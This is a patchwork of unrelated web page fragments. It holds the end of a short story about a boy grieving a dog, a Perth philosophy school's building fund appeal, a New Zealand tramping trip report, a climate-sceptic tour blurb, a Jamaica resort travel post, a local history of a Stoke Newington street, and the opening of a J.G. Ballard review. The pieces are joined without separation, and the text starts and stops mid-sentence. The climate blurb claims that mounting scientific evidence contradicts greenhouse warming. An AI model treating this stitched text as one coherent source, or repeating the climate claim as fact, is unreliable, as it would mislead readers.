couldn&#x2019;t wait to see her in the morning, he&#x2019;d never visit Red again. Poor Homer! Opening the bedroom door, he trudged outside.</p>   <p>Red had pulled a rug over Homer&#x2019;s head. The dog&#x2019;s legs poked out. Ruben shuffled around the rug so that all of Homer was covered. He said, &#x201c;Goodbye Homer. We love you,&#x201d; and his heart shrank into a nut.</p>   <p>Ruben went down to the creek. The bread bag was in a bush, he fished out the last slices throwing them into the water. Eels gathered, gobbled and swam away.</p>   <p>Raindrops plinked down making ripples.</p>   <p>Ruben remembered how Red hadn&#x2019;t showed up last Christmas even though he&#x2019;d promised to. His shoulders shook, he started crying; it made him feel small, stupid and small. He tried hard to stop the tears, the effort making him shudder. He splashed water on his face and stood up as tall as he could. Dad was a useless dick&#x2026;although he <em>had</em> taken him eeling.</p>   <p>Walking on, Ruben saw a spider web spread between the fig tree and the loo. Raindrops clung to the web, which quivered when another drop landed on it. Ruben counted twenty seven drops, shiny as mirrors, reflecting twenty seven miniature Ruben&#x2019;s. He ripped off the web, wiping the sticky mess onto the grass.</p>   <p>By the time he reached the house it was almost dark. He looked in the fridge &#x2013; only the off-milk, stinky shrivelled-up eel, a crumbling block of cheese and two beers.</p>   <p>Footsteps up the gravel: he froze.</p>   <p><em>Knock-knock</em>. &#x201c;Hey, little buddy?&#x201d;</p>   <p>Brodie! Ruben opened the door.</p>   <p>&#x201c;Are you okay?&#x201d;</p>   <p>&#x201c;Uhuh.&#x201d;</p>   <p>Brodie whistled admiringly at the eel picture Ruben had left on the table. &#x201c;Did you do that?&#x201d;</p>   <p>&#x201c;Yep.&#x201d;</p>   <p>&#x201c;<em>Awe</em>some.&#x201d;</p>   <p>&#x201c;It&#x2019;s for Mum.&#x201d;</p>   <p>&#x201c;She&#x2019;ll love it.&#x201d;</p>   <p>&#x201c;Hope so.&#x201d;</p>   <p>Brodie sighed. &#x201c;My old man was gonna finish off Homer if Red didn&#x2019;t do it. It must have been hard, Ruben, he loved that dog.&#x201d;</p>   <p>Silence grew.</p>   <p>&#x201c;Ah well, Red takes his time, but he gets there in the end. He even got rid of the rubbish, eh?&#x201d;</p>   <p>Ruben bit his lip.</p>   <p>&#x201c;Gotta go. Your Dad won&#x2019;t be long,&#x201d; he said, squeezing Ruben&#x2019;s shoulder.</p>   <p>Ruben felt a bit better. He rummaged in the cupboards finding a packet of two-minute noodles. He boiled the jug and stirred water through the noodles, dragging his fork around the bowl making sure he ate every last scrap. They were all there was to eat apart from the Coco Pops and he&#x2019;d need those for breakfast.</p>   <p>Still hungry, Ruben thought he&#x2019;d try a beer. He grabbed a can from the fridge, ripping off the tab and having a go. Yuk! It tasted of old socks. Another sip, the bubbles tickled his nose.</p>   <p>Car tyres squealed outside, skidding to a stop. There came a loud whoop from next door&#x2026;rowdy singing&#x2026;<em>&#x201c;Nah nah nah, nahnah, nah nah nah, nahnah. Hey beauty when the moon gets you down</em>.<em>&#x201c;</em></p>   <p>Ruben went into the lounge, switching on the telly; boring news, boring cricket, <em>Dancing With Stars</em>. The sparkly dancers swirled around while he sipped the beer, sitting in Red&#x2019;s armchair. His head began to spin. Was he drunk? It no longer mattered that he was hungry and lonely, the universe would grant him one wish, one simple wish&#x2026;</p>   <p>&#x2013;</p>   <p>Ruben tried to roll over. He was caught in a huge hand and the harder he tried to break free, the tighter it gripped. Panicked, he gave one last heave &#x2013; and woke. He&#x2019;d sunk deep into the armchair. Someone had put a blanket over him. Dad?</p>   <p>He spied the beer can and remembered last night: Dad storming off, the empty cupboards, the people next door laughing. Anger flared, Red had blamed <em>him</em> for Homer dying.</p>   <p>Ruben smelt bacon. Curious, he went into the kitchen.</p>   <p>Brodie was breaking eggs into a fat-spitting frying pan. &#x201c;Morning,&#x201d; he said. &#x201c;Hope you&#x2019;re into fry-ups, best thing for a hangover.&#x201d;</p>   <p>Ruben blushed. &#x201c;Did you go to the shops?&#x201d;</p>   <p>&#x201c;This place needs a woman, it&#x2019;s a tip.&#x201d;</p>   <p>A stack of toast was on the table, a carton of apple juice, peanut butter, jam.</p>   <p>&#x201c;Where&#x2019;s Dad?&#x201d;</p>   <p>&#x201c;Out the back.&#x201d;</p>   <p>Ruben paused on the doorstep.</p>   <p>Dad was digging a big hole under the fig tree. Working out the spade, he dropped the load onto a growing heap.</p>   <p>His heart beating hard, Ruben slowly walked towards him. &#x201c;We buried my guinea pig in the garden.&#x201d;</p>   <p>Dad glanced up. Shocked at how sad he looked, Ruben stepped closer.</p>   <p>&#x201c;Want to help?&#x201d; Dad asked.</p>   <p>&#xa0;</p>    </div>

   <div>   <h2>Building Fund</h2>   <div>    <div>     <p>Burswood Property</p>    </div>    <p><span>The School&#x2019;s main premises is in Burswood and is a heritage property purchased by the School in 2003. The Victoria Park Shire Council town planning department have worked closely with the School on plans for its use and restoration. The School has undertaken the Councils suggestions in this regard, however, funding for the project is limited to student donations and fund raising events, plus any surplus from the day to day operation of the School.</span></p>    <p><span>To this end, the School has set up a <strong>Building Fund</strong> to raise the necessary funds to pay the mortgage (interest and principal), maintain and improve the interior and exterior of the building and to meet the Councils recommendations for the restoration.</span></p>    <h1><span>What is The Building Fund?</span></h1>    <p>, or <span> While course fees paid by students in the School are used to pay help pay for venues in which to hold the Introductory Courses, any surplus funds are redirected to the Building Fund to assist in the mortgage payments.</span></p>    <p>Purchased by the School of Philosophy Foundation Trust in 2003, the Burswood property is a heritage, c1900 era home. It holds 16 classes per week, including a study group that prepares the biscuits available during tea breaks. The intention in purchasing the Burswood property was to establish a permanent home for the School. It was also to act as a base, to ensure the School&#x2019;s long term success, to act as a meditation retreat for existing students, and as a cultural centre for the people of Perth.</p>    <p>The purchase and maintenance of the Burswood property depends primarily upon Tax deductible donations to the Building Fund. The mortgage at present is now under $35,000, after recent one off payments from funds raised through the annual Philosophy Expo and Summer Lecture Series and $20,000 donated by two very generous students.</p>    <p>The monthly interest payments are currently being met by generous donations from a handful of students, and monies collected from the refreshment breaks (tea and coffee donations).</p>    <p>Works completed to date include the restoration of much of the interior, including painting and furnishings in keeping with the era; resurfacing of the driveway and car parking bays on the premises which do not detract from the building itself; restoration of the front verandah; external painting and restoration of roofing, gutters and downpipes. During 2013 and 2014 new carpet to the downstairs refectory and office, establishment of the gardens to the front of the building, installation of fountains and water features at the front, a limestone and <b>iron</b> fence at the front of the property and the installation of <b>iron</b> <b>gates</b> at the top of the driveway were completed. </p>    <p>The Building Fund is the School&#x2019;s account for all donations and the School is also registered as a &#x2018;not for profit&#x2019; organisation so all donations are 100% tax deductible. To meet the loan repayments, continue the renovations, and pay off the current loan requires we raise a target of $45 000 over the next 2 years. Your donation, however small, will greatly assist the restoration and outright ownership of the Burswood property, and ensure a permanent home base for the Perth School of Philosophy as well as a study centre of excellence for all the people of Perth.</p>    <p><strong>Teague St, 2003</strong></p>    <p>You can use this form to make donations to the Building Fund via eftpos, credit card, cash or cheque.

   <div>   <p>Honestly, who would have thought it&#x2019;d be rainy fogged-in weather on <em>Labour Weekend</em>? Apparently not us, because we had a fairly intensive tramp planned that would have gone from Rangiwahia over to Howletts, then back via <b>Iron</b> <b>Gates</b>. Unfortunately it rained and it snowed and it didn&#x2019;t really work so well, but it was still worthwhile and from a personal perspective, I was still able to see places I hadn&#x2019;t seen before.</p>   <div>    Steve, Amanda and Paul north-west of Mangahuia.   </div>   <p><strong>Dates:</strong> 24th &#x2013; 26th October, 2008 (one day shorter than intended) <strong>Location:</strong> Ruahine Forest Park, Rangiwahia to Heritage Road-end. <strong>People:</strong> Steve, Amanda, Paul and me. <strong>Huts visited:</strong> Rangiwahia Hut (1 night), Triangle Hut (0 nights), <b>Iron</b> <b>Gates</b> Hut (1 night), Heritage Hut (0 nights). <strong>Intended Route:</strong> Walk to Rangiwahia, then around Maungamahue and the back of Te Hekenga , over to Taumataomekura, Teraha and to Howletts Hut for Saturday night. Then via Daphne Ridge, Otumore and down to <b>Iron</b> <b>Gates</b> Hut (or possibly Triangle Hut) for Sunday night, before heading back up to Rangiwahia Hut and out again on Monday. <strong>Actual Route:</strong> Due to weather issues we went straight down to Triangle Hut and <b>Iron</b> <b>Gates</b> Hut on Saturday, before continuing to the Heritage road-end on Sunday and getting out a day early. []</p>   <div>    This post is a    <em>trip report</em>. You can find other trip reports about other places linked from the , or by browsing the .   </div>   <p>After dinner from that Kebab shop at Bulls, we reached the Rangiwahia road-end at around 9.30&#x2019;ish, I guess. At the very least, after the walk up the hill (which from past experience seems to take about 90 minutes), we were settling down at around 11pm on Friday night. The weather forecast was already dismal, without much suggestion that things would clear up until about Monday. Although we&#x2019;d made plans to sleep in, Steve was still up and about at 6.30, and everyone followed.</p>   <p>There was some teasing clarity in the horizon to the west, with Ruapehu clearly visible, but we were slightly more concerned about an incoming southerly. The rest of the range to the east of Rangiwahia was already clagged in &#x2014; getting around the back of Te Hekenga and down to Howletts on the far side wasn&#x2019;t an enticing thing, especially since it was likely to just be cold and clouded-in all day. Instead, we thought we might try starting the plan in reverse, in the hope that the rivers wouldn&#x2019;t be up too much to interfere. So, after a casual breakfast, we packed up and left at 8am.</p>   <div>    Steve, Amanda and Paul heading towards the spur above Triangle Hut on Saturday morning.   </div>   <p>It took about an hour to reach the ridge just north of Mangahuia, which seems consistent with the previous three times I&#x2019;d been there. Looking over the edge, broken slabs of icy snow were still settled below us on the eastern side, making for an eerie walk through a fairly cold wind. Within about 30 minutes we were walking down the spur towards Triangle Hut, budgeting on being there for lunch. With the route down the spur quite slippery and covered in tussock, we were still on the tops until a little after 10am. From there we reached the relatively good track through the trees, arriving at Triangle before 11.</p>   <div>    Paul crossing part of the Oroua River outside Triangle Hut.   </div>   <p>Despite the rain, the northern branch of the Oroua River outside Triangle Hut wasn&#x2019;t flooded, although it was more full than it would often be. The first half of the walk to <b>Iron</b> <b>Gates</b> Hut (sometimes called <b>Iron</b> Gate Hut) is in this river, and the last few minutes requires getting over the <em>main</em> part of the Oroua River. Consequently, what we saw outside Triangle Hut did cause us to carefully consider whether we should be going any further. By the end of it, I think I was the last person being annoyingly indecisive, but we came to the consensus that the fact that it wasn&#x2019;t flooded would mean that the main part of the Oroua River down-stream wouldn&#x2019;t be flooded either. If we really got stuck somewhere, we at could at least fly-camp in the rain along the way until the river became safer. Besides, I&#x2019;ve been at Triangle Hut when it&#x2019;s raining a lot before, and if you really feel like going somewhere, the idea of potentially being trapped behind flooded rivers on all sides the next day really didn&#x2019;t appeal. At around midday, we set off south along the river towards <b>Iron</b> <b>Gates</b> Hut (often referred to as <b>Iron</b> Gate Hut, although the signs in the area seem to call it <b>Iron</b> <b>Gates</b>).</p>   <p>The river along here can be slightly gorgey, but in these conditions we always found reasonable crossing points that were rarely higher than knee-deep. There were a couple of minor areas where the current was uncomfortably strong, and it definitely helped to have someone nearby on firmer ground to use as support. At ten past one, we reached the end of the track leading over point 1037, to the other side where <b>Iron</b> <b>Gates</b> Hut is located. The first few minutes of this track follows a small stream up a gully, but it soon turns into a track of its own which is steep in some places, and without a lot of good hand-holds. It didn&#x2019;t feel particularly un-safe, though, within reason at least.</p>   <div>    Steve and Paul at the southern end of the track to    <b>Iron</b>    <b>Gates</b>.   </div>   <p>On the southern end, this track crosses one side-creek before sidling along a hillside above some nice waterfalls (down which I was glad we didn&#x2019;t need to climb), before landing at the main part of the Oroau River. As we expected, this river also wasn&#x2019;t flooded, but seeing it was enough to prompt me to put my camera away for a while. In hindsight I&#x2019;m really glad that I did.</p>   <p>The current was quite strong, but after some surveying and brief experimentation up and down the river, we eventually found a place we could cross reasonably comfortably. This was relief for me, because I&#x2019;d had in the back of my mind that we might become stuck somewhere between the two huts and have to camp out&#x2026; which is why both Amanda and I were both slightly surprised when Steve, who&#x2019;d been here recently, hopped straight back in the river a little further down and led us back to the side we&#x2019;d started from. <b>Iron</b> <b>Gates</b> Hut was still a few minutes along the river, and it seemed that there wasn&#x2019;t a clear route to it without a couple of extra crossings.</p>   <div>    Amanda watching Steve testing part of the river near    <b>Iron</b>    <b>Gates</b>.   </div>   <p>We were able to continue along the river-side for a few more minutes, but finally reached a point where some fast-moving rapids combined with an apparently gorgey rock-face on our side. It looked do-able to get around, but we just might get a bit more wet than we were already. In the distance on the far side of the river, we could see smoke wafting from the trees, indicating that there was someone home.</p>   <p>Steve was the first to lower himself down into the pool, which had a convenient ledge below it, and work his way around the edge of the rock-face. I followed, and soon found I couldn&#x2019;t see Steve ahead of me. Leaning backwards turned out to be a bad idea because I started floating on my pack and drifting away from the rock-face. It worked out fine, though, because Steve was grounded just around the corner and held out a hand to pull me in. Amanda and Paul followed, and the four of us now found ourselves standing in a small in-set into the rock on the far side of the river. Getting over to the far side from here was a challenge, but we managed it with the help of Steve (again) who anchored himself somewhere in the middle so as to help pull everyone past him and out the other side. <em>That</em> was an experience.</p>   <p>As we approached <b>Iron</b> <b>Gates</b> Hut at about 3pm, maybe in some kind of jovial mood, we met the three current occupants as we searched for dry clothing. The two Oringi Raincoats hanging outside suggested some kind of strong outdoor affiliation before we&#x2019;d even met them (that&#x2019;s my current theory, anyway), and it turned out they&#x2019;d come down from <b>Auckland</b> for the long weekend as an expedition on behalf of the . Earlier on Saturday the three of them had walked in from Heritage Lodge. I think their original plan had been to walk up further to Triangle, then up to Rangiwahia and out that way, but by the time we&#x2019;d arrived it sounded as if they were now intending to return the way they came &#x2014; probably due to weather. They had a nice fire going and were busy drying some of their things&#x2026; presumably things that hadn&#x2019;t been well stashed underneath their impressive raincoats. Steve, who had been starting to feel sick-ish, hopped up to one of the top bunks for a snooze. Amanda, Paul and I settled into the accommodation for the rest of the afternoon, with myself catching up on some reading before Amanda became the central figure in preparing a nice pasta and vegetable dinner.</p>   <p>It rained in patches overnight, sometimes intensively, although the river had actually gone <em>down</em> when I went out to check it on Sunday morning. Specifically, it&#x2019;d gone down by about 3 centimetres in the wide, wave-prone section that I&#x2019;d been using to wash the dishes the night before. Looking up to the tops, however, they still didn&#x2019;t look at all inviting. They&#x2019;d received more snow overnight, which boded for a potentially long and quite hard next couple of days. According to the plan, we&#x2019;d still need to be getting up to Howletts, which would probably take at least 6-7 hours in the conditions and wouldn&#x2019;t be very scenic. That would be followed by a long day of walking on Monday, probably at least 10 hours, and then a long, late and tiring drive back to Wellington on Monday night. Steve&#x2019;s condition, which seemed to have become more doubtful overnight, was also a convenient excuse for us to not bother trying.</p>   <p>There were a couple of other options we thought about. One was to go back the way we&#x2019;d come, past Triangle and then either head straight back to Rangiwahia for Sunday night, or down to Pourangaki or Kelly Knight (perhaps more interesting). Neither seemed that inviting, and with the Oroua River still flowing quite strongly it would have been more difficult to walk up against the current. We&#x2019;d definitely need to be looking for different crossing points from what we&#x2019;d used the day before. The LINZ map also indicates another track heading up a spur towards Rangiwahia from about the half way point between <b>Iron</b> <b>Gates</b> and Heritage, but Steve&#x2019;s attempt to come down this on another occasion several months before had suggested that it actually wasn&#x2019;t much of a track at all, and may actually have been densely overgrown. So in the end, we reached another consensus decision to simply walk to Heritage Lodge (near a road-end), and to figure out some way to get back to the van once we arrived.</p>   <div>    Nearing Heritage Lodge.   </div>   <p>We left <b>Iron</b> <b>Gates</b> Hut at 8.45am, saying goodbye to the Toi Toi Trekkers who&#x2019;d been waiting in bed while we packed up. It was a nice bush-walk through the rain, with a few undulations and a couple of crossings of side-creeks, but ultimately easily do-able. During one of our brief stops at 11.15am, we could see Heritage Lodge in the distance. 20 minutes later, having followed the sidling track around the hillside, we were there, and immediately greeted by two very friendly chaps from the Manawatu Branch of the . It was still raining, and although the sun almost emerged from time to time, it continued to tease us.</p>   <div>    The luxurious section of Heritage Lodge, reserved for NZDA.   </div>   <p>Heritage Hut (sometimes called Heritage Lodge) is an NZDA-built facility. An old lodge on the site burned down in 2005, apparently after some visitors let the fireplace get too hot and then packed up and left. <em><strong>[Edit 9-July-2010:</strong> There&#x2019;s another side to this story .<strong>]</strong></em> It&#x2019;s since been re-built by predominantly NZDA volunteers, with the help of many sponsors. The new facility is a fantastic lodge. The NZDA guys had a warm fire going and offered us hot water for a cuppa as we walked up, which was a great way to say hello. They were also keen to show off the features of the lodge, which we continued to take in as we settled down for an early lunch. For the record, anyone who thinks that kiwi hunters always like it rough needs to take a look in the private NZDA section of the lodge (NZDA permission would be required), which comes complete with a mini-kitchenette and a shiny shower cubicle. So much for the whole lowering-your-standards philosophy of the outdoors.</p>   <p>The other people we met at Heritage were a couple from the , who&#x2019;d walked up the track from the road to survey the area for a potential club trip they were planning in the near future. They were very friendly and helpful, and ultimately we were able to arrange for Amanda to walk back to their car with them, and then for them to drop her off at the Rangiwahia road-end to collect our van. The three of them left at about 12.15, with a loose arrangement that Paul, Steve and I would follow about an hour later. With nothing much else to do, Steve found a bunk to lie on for another daytime nap, while Paul and I chatted with the NZDA people and browsed the hut literature.</p>   <div>    Steve at the Heritage road-end.   </div>   <p>The remaining walk back to the Heritage road-end almost feels as if it&#x2019;s a vehicle track in some places, and having left at 1.30pm and moving at a very relaxed pace, we were at the fence bordering Ruahine Forest Park about 20 minutes later. The timing was good and Amanda drove up at about 2.15pm, just as we&#x2019;d begun to walk down the road. As Steve pointed out, leaving on Sunday instead of Monday (Labour Day) had the added advantage of us not having to pay a surcharge at the cafe in Kimbolton, where we stopped for a decent second lunch.</p>   <p>With breaks in the weather emerging, we could now clearly see the freshly snow-capped mountain range over which we <em>might</em> have been walking if the weather had played more nicely earlier in the day, but I guess on this occasion it wasn&#x2019;t to be. We really needed two days of good weather to have carried out the original plan and for it to be worthwhile. Attempting it in reverse also complicated things further by putting the longest day of walking on the same day we wanted to drive home, and the uncertainty of exactly how this would pan out was a significant factor in us deciding to get out early. I still got to visit several places I haven&#x2019;t been, however, and we&#x2019;ll probably get another chance to try it again in the future.</p>   <div>    What the storms left behind.   </div>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

The tour is entitled Climate of Freedom.</p>   <p>While few of us are familiar with Agenda 21 we are likely to have heard the term &#x201c;Sustainable Development&#x201d;, &#x201c;Smart Growth&#x201d;, or &#x201c;Renewable Energy&#x201d;. We may think that this is a &#x201c;not in my backyard&#x201d; issue that we can take or leave as we wish.

The motivations, purposes and methodology of those who persist in alarmism on this topic, despite the mounting scientific evidence to the contrary and the 16 year &#x2018;pause&#x2019; in rising global average surface temperatures is more transparent. As the evidence increasingly contradicts the theory of greenhouse gas impacts on global temperatures the alarm is morphing to climate disruption, climate chaos, extreme weather and other scary stuff, since the temperatures are not keeping in step with rising CO2.</p>   <p>Don&#x2019;t you want to know what is going on here?</p>   <p>Contact us for further information or media enquiries.

   <div>   <p>When Matt and I got married, we chose to set up a honeymoon fund rather than a traditional gift registry. The fund was divided into excursions that we wanted to take on our trip around the world. One of those was a dream stay at Goldeneye Resort in Oracabessa, Jamaica. The resort is on the grounds of Ian Fleming&#x2019;s house on Oracabessa Bay. Chris Blackwell, founder of Island Records (Bob Marley, U2, etc) purchased the property and turned it into a beautiful resort. We decided to book a visit to Jamaica in time to celebrate Matt&#x2019;s birthday.&#xa0;Being fans of James Bond, we were excited to see what GoldenEye had to offer. &#xa0;After a stay in Florida to visit family and downsize a bit, we flew to Jamaica.</p>   <p>GoldenEye is the kind of place that you have to know where it is, otherwise you would never find it. They do not have any advertisement&#xa0;outside at their&#xa0;address, just a wrought <b>iron</b> gate in the trees with a little white sign on it that says &#x201c;Private&#x201d;. We had to call them to get directions for our driver.</p>   <p>When we arrived on the lush, tree-filled property, we were met by their concierge, Clayton, as well as several of the guests who we found out were regulars. Staff grabbed our bags while Clayton walked us to our cottage on the lagoon. As we descended down the steps, we passed the restaurant and the water sports area where they offered free kayaks, paddle boards, snorkel gear, and glass-bottomed boat rides. We crossed a bridge over the entrance of the lagoon and made our way down the path between two and three story houses that faced the sea.</p>   <p>Behind these houses was the lagoon and our cottage, number 8. We had our own dock with two kayaks, a patio with lots of seating, chaise lounges, and a table. Inside, was a large bed with mosquito netting, a bar, a full basket of tropical fruit, and a beautiful large bathtub. I thought that I was in heaven. Then Clayton opened the back door of the cottage that opened right up on to the lagoon so we could jump from our room right into the warm Jamaican water. That is when we knew that we were in heaven and that heaven comes with a free bottle of Blackwell Rum.</p>   <p>Now don&#x2019;t think that we spent our four days at GoldenEye doing nothing but lazing around in the water and drinking lots of rum. On our second day, we received a phone call from the front desk at the hotel asking if we would be interested in going to a &#x201c;turtle release&#x201d; that evening. We said &#x201c;yes&#x201d; right away. The hotel arranged transport and a small group of us rode out to St. Mary&#x2019;s, just further down on Oracabessa Bay. The driver dropped us at the ruins of an old resort and walked us through the crumbling structure to a beautiful beach where we met Mel Tennant.</p>   <p>Mel arrived in Jamaica in 2003. He says that he knew nothing of turtles. A couple of years later he began to see the turtles in front of his property in St. Mary&#x2019;s&#xa0;and became interested in helping them. He teamed up with the to create a monitoring system and continues to assist in releasing the baby turtles. He is on track to have helped release 25,000 turtles by the end of 2015. Mel also works with local groups to provide education to the citizens of Jamaica on how to protect the turtles and to keep the people from eating them. Mel explained that while turtle meat is considered a delicacy, it is extremely dangerous to eat because the turtles eat the poisonous sea sponges on the floor of the sea. Those toxins do not cook out and can kill infants and the elderly.</p>   <p>Helping the babies get from the nest to the sea requires constant monitoring of the nests and birthing times. Sea turtles typically birth during a full moon. Mel and his team of volunteers watch for turtle tracks, check for nests, and then begin the countdown to when the babies will hatch.</p>   <p>Our job was to help Mel by taking the baby turtles to the sea to rinse off the sand and egg residue. Then we carried them back up to a bucket near their nest where they were counted. When the turtles had been counted twice, Mel carefully tipped the bucket to allow the turtles to make their way quickly to the water.</p>   <p>Our job was to watch them and keep wildlife away &#x2013; seagulls, cats, dogs, etc. Releasing the babies up near their nest so they had to make their own way to the water, allowed for the female turtles to set their internal navigation to that beach spot so they can return in a few years to lay their own eggs. If they don&#x2019;t get this time, then they may never procreate because females always return to their place of hatching to lay their eggs.</p>   <p>That day we assisted with the release of 244 baby turtles. The babies were adorable and while we could only hold them for a few second, we all gave them words of advice &#x2013; swim fast and stay safe.</p>   <p>We only had four days at GoldenEye, but we have a feeling that we will be back. It is a beautiful place. It is not traditionally luxurious, instead, it feels like going home except to&#xa0;a home where you have warm and friendly staff, a chef, good bartenders, and a great soundtrack of wild birds, waves from the sea, and global tunes on drifting in from the beach bar, Bizot.</p>   <p>-Neeley (travelling 28-31&#xa0;August, 2015)</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
   <div>   <p><em>(under construction &#x2013; please get in touch with John if you can supply any additions or corrections)</em></p>   <p>The street named Listria Park owes its unusual shape to the , now one of London&#x2019;s lost rivers, which at one time helped to define the northern boundary of the estate of (1640-1721), Lord Mayor of London.</p>   <p>Stoke Newington was at that time something of a centre of nonconformist Protestantism, and an even more celebrated resident of the Abney estate was (1674-1748), known nowadays as the father of the English hymn school, though he was also a prolific writer on theological subjects, with robust awaiting unrepentant sinners.</p>   <p>Pictured left, as it is today, is Dr. Watts Mount (or Mound), which then stood beside (or as some allege, on a tiny island in the middle of) the Hackney Brook.&#xa0; It was reputedly his favourite site of contemplation, and a stone tablet erected there in his memory by his admirers still adorns it.&#xa0; The mound is within a few feet of what today is No. 1 Listria Park.&#xa0; The Abney estate&#x2019;s boundary remained unchanged when, in 1840, it became .&#xa0; Some of the exotic trees planted at that time still remain, but nature has largely taken over.&#xa0; Today Abney Park&#x2019;s densely wooded 32 acres of wildlife preserve constitute the view from the back of houses on the west and south sides of Listria Park.</p>   <p>By 1860, thanks to the mid-Victorian population explosion, the Hackney Brook had become an open sewer.&#xa0; Responding to the &#x2018;&#x2018; of 1858, the Metropolitan Board of Works consigned it underground as part of the sewage system designed by &#xa0; Today (says Wikipedia) the Brook is untraceable, having become lost in the labyrinth of sewers as they developed.&#xa0; This photo from the Hackney Archives shows the building of the sewer, which carried effluent from as far away as Highgate and delivered it to the main sewerage system at Old Ford.&#xa0; (click on the image to enlarge)</p>   <p>An Ordnance Survey map of 1864 shows what appears to be a formally planted garden in the area now occupied by Listria Park and Martaban Road.</p>   <p>This section of the map shows Dr. Watts Mound at the top left-hand corner, with the edge of what was by then Abney Park Cemetery (1840) running down the left-hand side of the map.&#xa0; The cemetery&#x2019;s wall (today lying at the bottoms of Listria Park back gardens) runs south, to the right of a line of trees.&#xa0; Manor Road passes diagonally across the top right-hand corner, while towards the bottom of the map what is now Martaban Road is shown as a tree-lined path running west to east, with non-rectangular buildings on its north side suggestive of ancient property boundaries.&#xa0; (click on image to enlarge)</p>   <p>The next detailed Ordnance Survey map dates from 1894-6, and shows the Listraban area laid out as streets, with vacant plots at Nos. 61, 63, 125 and 127 Listria Park, possibly because of unstable, sandy subsoil resulting from the course of long-forgotten waterways.&#xa0; In the 1990s soaring property values led to the underpinning and development of all four sites, with the addition of the present 137 Listria Park.&#xa0; A double-fronted house at 44 Listria Park, shown in the 1894 map, disappeared at some point after 1937, and the resulting gap was only refilled in the late 20th century.</p>   <p>One curiosity today is No. 23 Martaban Road, whose facade is somewhat suggestive of a chapel, but if so it does not date from the Victorian high tide in church- and chapel-building, for the site is shown as vacant in the 1896 map.&#xa0; The frontage features a stone carving of a ram&#x2019;s head, and the fact that the ram is a Biblical symbol for Christ may be a further clue to the building&#x2019;s original function.&#xa0; Before its recent conversion into flats it was used as a dressmaking workshop.</p>   <p>25 Martaban Road was also a vacant site in 1896, but by 1937 the plot was filled with a utilitarian red brick light industrial building.&#xa0; Its upper floor was later to be occupied by the Hackney Pakistani Women&#x2019;s Welfare Centre, a voluntary organisation run by a Listria Park family named Qureishi.&#xa0; Among other things it taught employment skills and dispensed health advice and a weekly lunch for the elderly.&#xa0; Around the turn of the century, following a fire in the ground floor warehouse, the building was converted into the present flats.&#xa0; In both this case and that of 61 and 63 Listria Park, developers had to overcome reluctance by planners to grant change of use, for in Hackney, not the most economically thriving of boroughs, the loss of land supporting employment is resisted.</p>   <p>Unlike the stately villas that by the mid-19th century lined Stamford Hill (homes to affluent bankers escaping the unsalubrious air of the City), the newly-constructed Listria Park and Martaban Road offered more modest dwellings to the capital&#x2019;s burgeoning work force.&#xa0; From contrasts in style and size it is clear that the streets were divided into parcels leased to different speculative builders, with the grandest at the north-east wing of Listria Park and the most modest on the southern stretch.&#xa0; In many houses the original decorative cornices and fireplaces have survived.</p>   <p>An indication of the social character of the first generation of occupiers comes from the census of 1901 &#x2026; <em>(to be researched)</em></p>   <p>Like an old soldier, Listraban today shows the honourable scars of war wounds.&#xa0; At a few front gates the observant eye will notice small rectangles of iron in the ground, surrounded by lead.&#xa0; Those are the vestiges of the original cast iron railings, torched down during the Second World War to make munitions.&#xa0; Nearby Summerfield Road, off Church Street, whose railings somehow survived, gives an idea of what Listraban would have looked like before 1939.</p>   <p>Another testimony to the war is the slightly hazy view from some of Listria Park&#x2019;s back windows.&#xa0; A bomb is said to have fallen in Abney Park, and the roughly-surfaced wartime glass that replaced blown-out windows still survives in some homes.</p>   <p>In the 20th century the 61-63 Listria Park site was at times the focus of controversy.&#xa0; It had been occupied by&#xa0; the Jeakins family, resident in Listria Park, who ran a removals business and used the plot, laid to concrete, as a park and maintenance site for their lorries.&#xa0; This was not universally popular, and oral tradition has it that abortive schemes were hatched to undermine it by such measures as having the road made one-way, which, given the sharp south-east corner, would have made the manoeuvring of lorries difficult at times.&#xa0; (That point was well demonstrated when police diverting traffic unwisely directed a 106 bus into Listria Park).&#xa0; In fact the marshalling of lorries carried on until Danny Jeakins acquired ownership of the site and planning permission for the houses that now stand there.</p>   <p>The character of Listraban had meanwhile undergone a significant change following the 1974 Housing Act, which empowered local governments to set up &#x2018;Housing Action Areas&#x2019; with a view to improving housing quality.&#xa0; This led to the appearance of cobbled promontories built out from the pavements, some of them with tree pits, others carrying large containers for decorative plants.&#xa0; These features contribute greatly to the special atmosphere of Listraban.</p>   <p>The present Community Association eventually took over responsibility for maintenance of the containers.&#xa0; At one stage there were even fantasies of temporarily exploiting the then vacant sites as communal gardens, but the practical obstacles were too formidable.</p>   <p>&#xa0;</p>  </div>  
   <div>   <p>&#xa0;</p>   <p><em>(c) Flamingo Books</em></p>   <p>&#xa0;</p>   <p>I opened J.G. Ballard&#x2019;s 1994 novel <em>Rushing to Paradise</em> with a little trepidation because of two common assumptions about Ballard&#x2019;s oeuvre: firstly, that he was&#xa0;better at writing short stories than at writing novels; and secondly, that his earlier novels &#x2013; those up until 1984&#x2019;s <em>Empire of the Sun</em>, including the loose trilogies of <em>The Drowned World</em>, <em>The Drought</em> and <em>The Crystal World</em> (1964-1966) and <em>Crash</em>, <em>Concrete Island</em> and <em>High Rise</em> (1973-1975) &#x2013; are better than his later ones.</p>   <p>&#xa0;</p>   <p>Generally, I agree with both assumptions.&#xa0; While I think Ballard, who died in&#xa0;2009,&#xa0;wrote some excellent novels, none of them had quite the same impact on me that his best short stories did &#x2013; items like <em>Concentration City</em>, <em>The Drowned Giant</em>, <em>Now Wakes the Sea </em>and <em>The Air Disaster</em> are masterpieces of short fiction that aspiring young writers should be made to study in order to learn How It Is Done.&#xa0; And though I always got some enjoyment out of his later novels, such as <em>Super</em>-<em>Cannes</em> (2000), <em>Millennium</em> <em>People</em> (2003) and <em>Kingdom</em> <em>Come</em> (2006), it was clear that they weren&#x2019;t in the same league as his earlier novels.</p>   <p>&#xa0;</p>   <p>The problem with his later books, I feel, is that there&#x2019;s too much going on in them and as a consequence they lack focus.&#xa0; For example, <em>Kingdom</em> <em>Come</em>, which looks at the disturbing influence that a huge new shopping mall has on the inhabitants of a satellite town outside London, begins with a shooting spree by a crazed gunman, then touches on several contemporary issues like racism, football hooliganism and rampant 21<sup>st</sup>-century consumerism, and ends with a bizarre final section where an assortment of misfits take over the mall and try to set up a new (and inevitably dystopian) society inside it, like William Golding&#x2019;s <em>Lord of the Flies</em> or Alex Garland&#x2019;s <em>The Beach</em> crossed with the George A. Romero movie <em>Dawn of the 